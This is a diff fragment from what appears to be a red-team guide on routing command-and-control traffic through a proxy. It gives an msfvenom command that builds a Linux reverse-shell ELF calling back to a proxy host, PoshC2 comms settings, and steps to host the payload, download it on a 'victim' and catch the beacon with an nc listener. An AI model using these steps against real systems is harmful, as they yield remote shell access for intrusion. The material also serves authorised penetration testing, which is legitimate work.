@@ -55,7 +55,7 @@
     ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<proxy-ip> LPORT=8080 -a x64 -f elf > yup.elf
     ```
-    > **NOTE:** Follow the same setup if you are using poshc2 for you bind port, probably 
+    > **NOTE:** Follow the same setup if you are using Poshc2 set your bind port to 80/443, and in `payloadcomshost` set your `http://proxy-ip:<stream-listening-port>`
 8. Host your payload however and download on victim 
 9. Now if you are running msfvenom start you `nc` listener to catch your beacon.
     ```bash
